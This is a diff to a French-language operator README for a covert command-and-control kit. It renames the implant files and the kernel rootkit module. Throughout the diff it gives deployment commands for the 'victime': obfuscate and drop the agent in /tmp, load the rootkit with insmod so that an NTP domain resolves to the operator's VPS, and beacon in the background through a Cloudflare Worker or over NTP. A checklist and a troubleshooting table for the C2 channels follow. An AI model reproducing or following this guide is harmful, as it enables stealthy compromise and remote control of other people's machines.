@@ -63,7 +63,7 @@ Deux canaux C2 indépendants. Même interface opérateur (`operator_cli.py`).
                                                             │
                                                             │ GET /task/{id}
                                                             ▼
-                                                        agent.py
+                                                        nullrelay.py
                                                         [exécute cmd]
                                                             │
                                                             │ PUT /result/{task_id}
@@ -128,17 +128,17 @@ python3 server.py
 
 ```bash
 # Récupérer l'ID de l'agent sur la cible
-python3 agent.py --id
+python3 nullrelay.py --id
 # → ex: 3685e93ab6597954b51d83969dd4f1ad
 
 # Générer un agent personnalisé via la TUI
-cd Modules/C2/cloudflare-worker
+cd Modules/C2
 WORKER_URL=https://... C2_PSK=... python3 tui.py
-# → onglet "Payload" → remplir WORKER_URL et PSK → "Bake Agent"
-# → optionnel : cocher "Obfuscate" pour passer par obfuscator_py.py
+# → onglet "Payload" → sélectionner "cloudflare" → remplir WORKER_URL et PSK → "Generate"
+# → optionnel : cocher "Obfuscate" pour passer par shadowscript.py
 
-# OU manuellement : éditer les variables en tête d'agent.py puis obfusquer
-python3 ../../Obfuscator/obfuscator_py.py agent.py
+# OU manuellement : éditer les variables en tête de nullrelay.py puis obfusquer
+python3 ../../Obfuscator/shadowscript.py nullrelay.py
 # → déployer le fichier obfusqué sur la cible
 ```
 
@@ -171,7 +171,7 @@ python3 ../operator_cli.py wait <task_id>
                                                   (VPS C2)
 
   VICTIME                                          SERVEUR C2
-  agent.py                                         ntp/server.py
+  clockvenom.py                                    ntp/server.py
 
   1. résoud le domaine NTP                         UDP/123
      → obtient l'IP du VPS (via /etc/hosts)    ┌──────────┐
@@ -231,7 +231,7 @@ C2_PSK=... C2_DEBUG=1 python3 server.py
 
 ```bash
 # Sur la CIBLE — s'assurer que le rootkit est chargé
-cd /tmp/rb && insmod rootkit.ko
+cd /tmp/rb && insmod ironveil.ko
 
 # Vérifier que le domaine NTP résoud bien vers le VPS
 # (en se nommant ntp-agent pour bypasser le filtre du rootkit)
@@ -243,13 +243,13 @@ print(socket.gethostbyname('0.debian.pool.ntp.org'))
 # doit afficher l'IP du VPS
 
 # Récupérer l'ID agent
-python3 /tmp/agent.py --id
+python3 /tmp/clockvenom.py --id
 
 # Lancer l'agent (beacon toutes les ~60s ± 30s)
-C2_PSK=mon_mot_de_passe_secret python3 /tmp/agent.py
+C2_PSK=mon_mot_de_passe_secret python3 /tmp/clockvenom.py
 
 # Intervalle court pour les tests
-C2_PSK=... C2_INT=15 C2_JITTER=5 nohup python3 /tmp/agent.py > /tmp/agent.log 2>&1 &
+C2_PSK=... C2_INT=15 C2_JITTER=5 nohup python3 /tmp/clockvenom.py > /tmp/clockvenom.log 2>&1 &
 ```
 
 ### Étape 3 — Opérer
@@ -332,10 +332,10 @@ C2_PSK=... C2_ADMIN_PORT=1338 python3 tui.py
 ```
 
 L'onglet **Payload** génère un agent personnalisé selon le type choisi :
-- **cloudflare** : bake `cloudflare-worker/agent.py` avec `WORKER_URL` et `C2_PSK`
-- **ntp** : bake `ntp/agent.py` avec `C2_PSK`, intervalle et jitter (pas de WORKER URL)
+- **cloudflare** : bake `cloudflare-worker/nullrelay.py` avec `WORKER_URL` et `C2_PSK`
+- **ntp** : bake `ntp/clockvenom.py` avec `C2_PSK`, intervalle et jitter (pas de WORKER URL)
 
-Les deux modes supportent l'obfuscation automatique via `obfuscator_py.py`.
+Les deux modes supportent l'obfuscation automatique via `shadowscript.py`.
 
 ---
 
@@ -355,11 +355,11 @@ Les deux modes supportent l'obfuscation automatique via `obfuscator_py.py`.
 ### Canal NTP
 
 ```
-[ ] Rootkit chargé sur la cible (insmod rootkit.ko)
+[ ] Rootkit chargé sur la cible (insmod ironveil.ko)
 [ ] Vérifier injection /etc/hosts via mmap
 [ ] VPS : UDP/123 + TCP/443 ouverts dans firewall
 [ ] C2_PSK=... python3 ntp/server.py  (sur VPS, root)
-[ ] C2_PSK=... C2_INT=15 python3 /tmp/agent.py  (sur cible)
+[ ] C2_PSK=... C2_INT=15 python3 /tmp/clockvenom.py  (sur cible)
 [ ] C2_ADMIN_PORT=1338 python3 operator_cli.py agents  → agent visible
 ```
 
@@ -371,7 +371,7 @@ Les deux modes supportent l'obfuscation automatique via `obfuscator_py.py`.
 |---|---|---|
 | Agent absent de la liste | PSK différent entre agent et serveur | Vérifier `C2_PSK` des deux côtés |
 | Tâche reste `sent` | Agent ne beacon pas / tâche perdue | Vérifier que l'agent tourne, re-queue la tâche |
-| NTP : agent résoud la vraie IP | Rootkit pas chargé / comm pas `ntp-agent` | `insmod rootkit.ko`, vérifier via mmap |
+| NTP : agent résoud la vraie IP | Rootkit pas chargé / comm pas `ntp-agent` | `insmod ironveil.ko`, vérifier via mmap |
 | NTP : beacon timeout | UDP/123 bloqué ET TCP/443 bloqué | Vérifier firewall VPS et NAT victime |
 | NTP : résultat jamais reçu | Paquet trop grand (> 203B réseau) | Sortie tronquée à 120 chars automatiquement |
 | Cloudflare : 404 sur Worker | WORKER_SECRET incorrect | Recalculer token avec même PSK |
